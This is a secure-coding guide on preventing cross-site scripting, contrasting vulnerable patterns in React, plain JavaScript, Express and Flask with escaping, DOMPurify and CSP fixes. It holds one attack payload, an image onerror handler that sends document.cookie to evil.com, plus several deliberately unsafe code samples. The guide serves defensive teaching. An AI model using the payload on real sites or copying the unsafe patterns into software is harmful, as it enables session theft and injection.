---
title: XSS Prevention
impact: CRITICAL
category: security
tags: xss, security, html, javascript
---

# Cross-Site Scripting (XSS) Prevention

Never insert unsanitized user input into HTML. Always escape output or use frameworks that auto-escape by default.

## Why This Matters

XSS allows attackers to inject malicious scripts into web pages viewed by other users, enabling:
- Session hijacking (stealing cookies/tokens)
- Credential theft (keylogging, form hijacking)
- Defacement
- Phishing attacks
- Malware distribution

## ❌ Incorrect

**Problem:** User input inserted directly into HTML without escaping.

```javascript
// React - dangerous!
function UserProfile({ user }) {
  return (
    <div dangerouslySetInnerHTML={{ __html: user.bio }} />
  );
}

// Vanilla JS - dangerous!
document.getElementById('username').innerHTML = userInput;

// Template literal - dangerous!
const html = `<div>Hello ${username}</div>`;
```

**Attack example:**
```javascript
const maliciousInput = '<img src=x onerror="fetch(\'https://evil.com?cookie=\'+document.cookie)">';
// If inserted without escaping, runs attacker's JavaScript
```

## ✅ Correct

### React (Auto-escaping)
```jsx
function UserProfile({ user }) {
  // ✅ React auto-escapes by default
  return <div>{user.bio}</div>;
}

// If HTML is necessary, sanitize first
import DOMPurify from 'dompurify';

function UserProfile({ user }) {
  const sanitizedBio = DOMPurify.sanitize(user.bio);
  return (
    <div dangerouslySetInnerHTML={{ __html: sanitizedBio }} />
  );
}
```

### Vanilla JavaScript
```javascript
// ✅ Use textContent for plain text
element.textContent = userInput;

// ✅ Create elements safely
const div = document.createElement('div');
div.textContent = username;
container.appendChild(div);

// ✅ If HTML needed, sanitize first
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userHtml);
```

### Backend (Express + Template Engines)
```javascript
// ✅ Template engines auto-escape
// EJS
<div><%= username %></div>  // Escaped
<div><%- username %></div>  // NOT escaped (dangerous)

// Handlebars
<div>{{username}}</div>     // Escaped
<div>{{{username}}}</div>   // NOT escaped (dangerous)

// Pug
div= username               // Escaped
div!= username              // NOT escaped (dangerous)
```

### Python (Flask/Jinja2)
```python
from markupsafe import escape

# ✅ Manual escaping
@app.route('/user/<username>')
def user_profile(username):
    return f'<h1>Hello {escape(username)}</h1>'

# ✅ Jinja2 auto-escapes
# template.html
<h1>Hello {{ username }}</h1>  {# Escaped #}
<h1>Hello {{ username|safe }}</h1>  {# NOT escaped #}
```

## Types of XSS

### 1. Reflected XSS
```javascript
// ❌ Dangerous: reflects URL parameter into page
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`<h1>Results for: ${query}</h1>`);
});

// ✅ Safe: escape output
app.get('/search', (req, res) => {
  const query = escape(req.query.q);
  res.send(`<h1>Results for: ${query}</h1>`);
});
```

### 2. Stored XSS
```javascript
// ❌ Dangerous: stores unsanitized input
app.post('/comment', async (req, res) => {
  await db.comments.insert({ text: req.body.comment });
});

// Later displayed without escaping
app.get('/comments', async (req, res) => {
  const comments = await db.comments.find();
  const html = comments.map(c => `<p>${c.text}</p>`).join('');
  res.send(html);
});

// ✅ Safe: sanitize on input and escape on output
import DOMPurify from 'isomorphic-dompurify';

app.post('/comment', async (req, res) => {
  const sanitized = DOMPurify.sanitize(req.body.comment);
  await db.comments.insert({ text: sanitized });
});
```

### 3. DOM-based XSS
```javascript
// ❌ Dangerous: uses URL fragment in DOM manipulation
const username = location.hash.substring(1);
document.getElementById('welcome').innerHTML = `Hello ${username}`;

// ✅ Safe: use textContent
const username = location.hash.substring(1);
document.getElementById('welcome').textContent = `Hello ${username}`;
```

## Content Security Policy (CSP)

Add defense-in-depth with CSP headers:

```javascript
// Express middleware
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';"
  );
  next();
});
```

**What CSP prevents:**
- Inline scripts from executing
- Scripts from unauthorized domains
- eval() and similar dangerous functions

## Sanitization Libraries

### DOMPurify (Browser & Node.js)
```javascript
import DOMPurify from 'dompurify';

// Basic sanitization
const clean = DOMPurify.sanitize(dirty);

// Custom config
const clean = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
  ALLOWED_ATTR: ['href']
});
```

### bleach (Python)
```python
import bleach

clean = bleach.clean(
    dirty_html,
    tags=['p', 'b', 'i', 'strong', 'em', 'a'],
    attributes={'a': ['href', 'title']},
    strip=True
)
```

## Best Practices Checklist

- [ ] **Use framework auto-escaping** (React, Vue, Angular, etc.)
- [ ] **Never use `innerHTML` with user input**
- [ ] **Sanitize HTML** if rich text is required (DOMPurify)
- [ ] **Implement CSP headers**
- [ ] **Validate input on server** (defense-in-depth)
- [ ] **Use HTTPOnly cookies** (prevents JavaScript access)
- [ ] **Encode output** for correct context (HTML, JS, URL, CSS)

## References

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [DOMPurify Documentation](https://github.com/cure53/DOMPurify)
- [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
